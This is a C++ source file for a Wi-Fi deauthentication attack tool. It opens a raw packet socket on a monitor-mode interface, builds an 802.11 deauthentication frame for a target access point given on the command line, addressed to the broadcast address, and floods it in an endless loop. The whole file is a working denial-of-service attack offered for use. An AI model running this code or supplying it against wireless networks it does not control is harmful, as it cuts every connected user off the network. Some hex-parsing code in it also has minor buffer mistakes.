#include<iostream>
#include<string>
#include<cstring>
#include<csignal>
#include<algorithm>

#include<assert.h>
#include<ctype.h>
#include<unistd.h>

#include<sys/types.h>
#include<sys/socket.h>
#include<sys/time.h>
#include<sys/ioctl.h>

#include<netinet/in.h>
#include<net/if.h>

#include<linux/if_packet.h>
#include<linux/if_ether.h>

#define DEAUTHSIZ 38


class WirelessTools {
      public: std::string device_name;
      public: std::string error_log;
      public: int sockfd;

      int create_monitor_mode_socket() {
            struct ifreq ifr;
            struct sockaddr_ll ll;

            assert(sizeof(ifr.ifr_name) == IFNAMSIZ);

            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

            if (sockfd < 0) {
                  this->error_log = "socket() creation failed - do you have permissions?";
                  return -1;
            }

            memset(&ifr, 0, sizeof(ifr));
            memcpy(ifr.ifr_name, this->device_name.c_str(), sizeof(ifr.ifr_name));

            if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
                  this->error_log = "ioctl() failed - is device name correct and in monitor mode?";
                  return -1;
            }

            memset(&ll, 0, sizeof(ll));

            ll.sll_family = AF_PACKET;
            ll.sll_ifindex = ifr.ifr_ifindex;
            ll.sll_protocol = htons(ETH_P_ALL);

            if (bind(sockfd, (struct sockaddr*)&ll, sizeof(ll)) < 0) {
                  this->error_log = "bind() failed - do you have permissions?";
                  return -1;
            }

            return sockfd;

      }

      public: class DeauthAttack {
            public: typedef uint8_t packet_t;
            public: std::string bssid;
            public: std::string client;
            public: std::string raw_bssid_str;
            public: std::string raw_client_str;
            public: DeauthAttack::packet_t raw_bssid[8];
            public: DeauthAttack::packet_t raw_client[8];
            public: std::string error_log;
            public: int rfsockfd;

            uint8_t create_deauth_message(DeauthAttack::packet_t * deauth_packet) {
                  this->raw_bssid_str = this->bssid;
                  this->raw_client_str = this->client;


                  this->raw_bssid_str.erase(std::remove(this->raw_bssid_str.begin(), this->raw_bssid_str.end(), ':'), this->raw_bssid_str.end());
                  this->raw_client_str.erase(std::remove(this->raw_client_str.begin(), this->raw_client_str.end(), ':'), this->raw_client_str.end());

                  char tmp_hex_buf[2];

                  for (int i = 0; i < 6; ++i) {
                        memset(tmp_hex_buf, '\0', sizeof(tmp_hex_buf));
                        memcpy(tmp_hex_buf, this->raw_bssid_str.c_str()+i*2, 2);
                        this->raw_bssid[i] = strtoul(tmp_hex_buf, NULL, 16);
                  }

                  for (int i = 0; i < 6; ++i) {
                        memset(tmp_hex_buf, '\0', sizeof(tmp_hex_buf));
                        memcpy(tmp_hex_buf, this->raw_client_str.c_str()+i*2, 2);
                        this->raw_client[i] = strtoul(tmp_hex_buf, NULL, 16);
                  }

                  int xpos = 0;
                  deauth_packet[0]  = 0x00; deauth_packet[1]  = 0x00;
                  deauth_packet[2]  = 0x0C;
                  deauth_packet[3]  = 0x00; deauth_packet[4]  = 0x04;
                  deauth_packet[5]  = 0x80; deauth_packet[6]  = 0x00; deauth_packet[7] = 0x00;
                  deauth_packet[8]  = 0x02; deauth_packet[9]  = 0x00; deauth_packet[10] = 0x18; deauth_packet[11] = 0x00;
                  deauth_packet[12] = 0xC0; deauth_packet[13] = 0x00; deauth_packet[14] = 0x3A; deauth_packet[15] = 0x01;
                  for (xpos = 0; xpos < 6; ++xpos) deauth_packet[xpos+16] = this->raw_client[xpos];
                  for (xpos = 0; xpos < 6; ++xpos) deauth_packet[xpos+22] = this->raw_bssid[xpos];
                  for (xpos = 0; xpos < 6; ++xpos) deauth_packet[xpos+28] = this->raw_bssid[xpos];
                  deauth_packet[34] = 0xF0; deauth_packet[35] = 0x3F;
                  deauth_packet[36] = 0x07; /* DEAUTH REASON 0x07 [GENERAL] */ deauth_packet[37] = 0x00;
                  deauth_packet[38] = '\0';

                  return DEAUTHSIZ;
            }

            int8_t send_deauth_message(DeauthAttack::packet_t * deauth_packet) {
                  int8_t status = (int8_t)send(this->rfsockfd, deauth_packet, DEAUTHSIZ, 0);
                  return ((status < 0)?-1:1);
            }

      };
};

class TerminalSetup {
      public: static const char * toggle_cursor(bool toggle) {
            return (toggle?"\x1b[?25h":"\x1b[?25l");
      }

      public: static void init() {
            std::cout << "\x1b[0m";
            std::cout << TerminalSetup::toggle_cursor(false);
            return;
      }

      public: static void cleanup(int sig) {
            std::cout << toggle_cursor(true);
            std::cout << std::endl;
            exit(0);
      }
};

int main(int argc, char ** argv) {
      if (argc < 3) {
            std::cout << "Usage $ " << argv[0] << " <DEVICE NAME> <NETWORK BSSID>" << std::endl << "This program works best when the wireless device is on the same channel as the network" << std::endl;
            return -1;
      }

      signal(SIGSEGV, TerminalSetup::cleanup);
      signal(SIGINT, TerminalSetup::cleanup);

      TerminalSetup::init();

      char * device_name_c   = argv[1];
      char * network_bssid_c = argv[2];
      //char * client_mac_c    = argv[3];

      std::string device_name(device_name_c);
      std::string network_bssid(network_bssid_c);
      //std::string client_mac(client_mac_c);

      WirelessTools wireless = WirelessTools();

      wireless.device_name = device_name;
      wireless.sockfd = wireless.create_monitor_mode_socket();

      if (wireless.sockfd < 0) {
            std::cout << wireless.error_log << std::endl;
            return -1;
      }

      WirelessTools::DeauthAttack deauth_attack = WirelessTools::DeauthAttack();

      deauth_attack.bssid = network_bssid;
      deauth_attack.client = "FF:FF:FF:FF:FF:FF";//client_mac;
      deauth_attack.rfsockfd = wireless.sockfd;

      WirelessTools::DeauthAttack::packet_t deauth_packet[64];

      deauth_attack.create_deauth_message(deauth_packet);

      int8_t status;
      uint64_t packet_count = 0;

      std::cout << "Target BSSID: " << deauth_attack.bssid  << std::endl;
      std::cout << "Client BCast: " << deauth_attack.client << std::endl;
      std::cout << "Device Name:  " << wireless.device_name << std::endl \
                                                                        << std::endl;

      while (true) {
            status = deauth_attack.send_deauth_message(deauth_packet);
            if (status < 0) {
                  perror("\nFailed to send deauth packet");
                  return -1;
            }
            packet_count++;
            printf("\r[%6.d] Deauth message sent    ", packet_count);
            fflush(stdout);
            usleep(17500);
      }

      return 0;
}
